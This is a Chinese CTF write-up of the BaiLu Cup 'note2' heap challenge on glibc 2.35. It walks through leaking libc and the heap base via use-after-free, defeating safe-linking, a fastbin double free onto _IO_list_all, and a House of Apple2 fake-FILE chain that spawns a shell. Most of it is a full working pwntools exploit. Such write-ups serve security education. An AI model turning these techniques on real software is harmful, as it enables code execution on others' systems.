---

title: BaiLu_note2
date: 2023-03-08 19:28:27
tags:
- pwn
- heap
- 高版本glibc
- House of xxx
categories:
- pwn_wp
---

柏鹭杯的note2，用的glibc2.35。

高版本的 glibc 封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。这些高版本的glibc利用往往涉及到io(House of ...)，而且不少都与large bin有关系，但这里走的是fast bin和tcache。

<!--more-->

堆题经典保护全开。glibc2.35的ld文件用的是ld-linux-x86-64.so.2而不是ld-2.35.so

```sh
patchelf --set-interpreter /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so --set-rpath /home/a1ph0nse/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ filename

# 高版本libc用ld-linux-x86-64.so.2，除此之外还要
sudo cp -r /home/a1ph0nse/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/.debug/.build-id/* /usr/lib/debug/.build-id/
```

这也是一个菜单，有增删查的功能；最多同时申请10个chunk，chunk的size<=0x200（small bin）；在删除的时候没有清空指针，存在UAF；查是简单的puts()；程序退出的时候走的是exit(0)。

可以通过UAF+查leak libc，通过fast bin double free劫持_IO_list_all，之后走House of Apple2的利用链。

### leak libc and heap base

利用unsorted bin和UAF来leak libc

heap base可以通过让两个chunk在unsorted bin中利用UAF来leak

heap base也可以利用**glibc2.32引入tcache的safe-linking（异或加密）机制**来leak，该操作在chunk被放入tcache bin和从tcache bin中取出时进行，会对**存放在`fd`处的指针**进行处理。

```c
#define PROTECT_PTR(pos, ptr, type)  \
        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr, type)   \
        PROTECT_PTR(pos, ptr, type)
```

实际上就是执行`ptr^(heap_base>>12)`。因此第一个放入tcache的chunk中的fd=(0^(heap_base>>12))==(heap_base>>12)，因此只要读出其中的值，并左移12位即可得到heap_base。

```py
key=uu64(r(5)) # heap_base长6字节,最后12位为0,右移12位后,接受5字节即可获得高36bit和额外的4bit
heap_base=key<<12 # 此时左移12bit即可得到heap_base
```

### djack _IO_list_all

这里要利用UAF控制unsorted bin或small bin并不容易，最方便的还是利用fast bin double free实现overlap，修改fd指向`_IO_list_all`，并且由于使用tcache，在tcache为空的情况下会先从fast bin放入tcache，再从tcache中取出，不会对`size`字段进行检查，因此不用调整偏移满足`size`字段。

### House of Apple2

伪造`IO_FILE`，利用House of Apple2，走`exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_wfile_overflow(_IO_wfile_jumps中的_IO_overflow)->_IO_wdoallocbuf->_IO_WDOALLOCATE->*(fp->_wide_data->_wide_vtable + 0x68)(fp)`

```py
# construct fake io
target_addr=heapbase+0xfc0

fake_fp=b'  sh' # flag <-target 
fake_fp=fake_fp.ljust(0x28,b'\x00')+p64(1) # write_ptr > write_base
fake_fp=fake_fp.ljust(0xa0,b'\x00')+p64(target_addr+0xe0) # ->wide_data
fake_fp=fake_fp.ljust(0xd8,b'\x00')+p64(_IO_wfile_jumps) # mode<=0 ->vtable
fake_fp=fake_fp.ljust(0xe0+0xe0,b'\x00')+p64(target_addr+0x210) # ->wide_data->vtable

fake_wide=b'\x00'
fake_wide=fake_wide.ljust(0x68,b'\x00')+p64(sys_addr) # fp->_wide_data->_wide_vtable + 0x68=RIP


add(1,0x200,fake_fp) # +0xfc0
add(2,0x200,fake_wide) # +0x11c0
```

### exp

exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('libc.so.6')
# p=process('./'+filename)
p=process('./pwn')
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
def add(idx,size,content):
  ru('> ')
  sl('1')
  ru('Index?\n')
  sl(str(idx))
  ru('Size?\n')
  sl(str(size))
  ru('Enter content: ')
  sl(content)

def free(idx):
  ru('> ')
  sl('2')
  ru('Index?\n')
  sl(str(idx))

def view(idx):
  ru('> ')
  sl('3')
  ru('Index?\n')
  sl(str(idx))

def exit_pwn():
  ru('> ')
  sl('4')

# leak libc and heap base
for i in range(7):
  add(str(i),0x110,b'\x00'*0x8)
add(7,0x110,b'\x00'*0x8)
add(8,0x110,'aaaaaaaa'*0x6)
add(9,0x70,'bbbbbbbb')

for i in range(1,7):
  free(str(i))
free(8)
free(7)
# 1-6 and 8 in tcache
# 0 and 7 leak
# unsorted head -> 0 -> 7
view(7)
libcbase=uu64(ru('\n')[2:-1])-0x219ce0
free(0)

view(0)
heapbase=uu64(ru('\n')[2:-1])-0xa70

# debug()

# fast bin double free
free(9)

for i in range(10):
  add(str(i),0x70,'f'*0x40)
for i in range(7):
  free(str(i))
# double free
free(7)
free(8)
free(7)

for i in range(7):
  add(str(i),0x70,'g'*0x30)

IO_list_addr=libcbase+libc.sym['_IO_list_all']
# 7==9, write 9 by 7
payload=p64(IO_list_addr^(heapbase>>12)) # bypass safe-linking (after glibc2.32)
add(7,0x70,payload)
add(8,0x70,'b'*0x40)
add(9,0x70,'c'*0x40)

_IO_wfile_jumps=libcbase+libc.sym['_IO_wfile_jumps']
sys_addr=libcbase+libc.sym['system']
one_gadget=libcbase+0xebcf8

# construct fake io
target_addr=heapbase+0xfc0

fake_fp=b'  sh'
fake_fp=fake_fp.ljust(0x28,b'\x00')+p64(1)
fake_fp=fake_fp.ljust(0xa0,b'\x00')+p64(target_addr+0xe0) # ->wide_data
fake_fp=fake_fp.ljust(0xd8,b'\x00')+p64(_IO_wfile_jumps)
fake_fp=fake_fp.ljust(0xe0+0xe0,b'\x00')+p64(target_addr+0x210)

fake_wide=b'\x00'
fake_wide=fake_wide.ljust(0x68,b'\x00')+p64(sys_addr)


add(1,0x200,fake_fp) # +0xfc0
add(2,0x200,fake_wide) # +0x11c0

# overwrite _IO_list_all
payload=''
add(0,0x70,p64(heapbase+0xfc0))  

leak('libcbase',hex(libcbase))
leak('heapbase',hex(heapbase))
leak('IO_list_addr',hex(IO_list_addr))
leak('_IO_wfile_jumps',hex(_IO_wfile_jumps))
leak('system',hex(sys_addr))
debug()

exit_pwn()

itr()

```

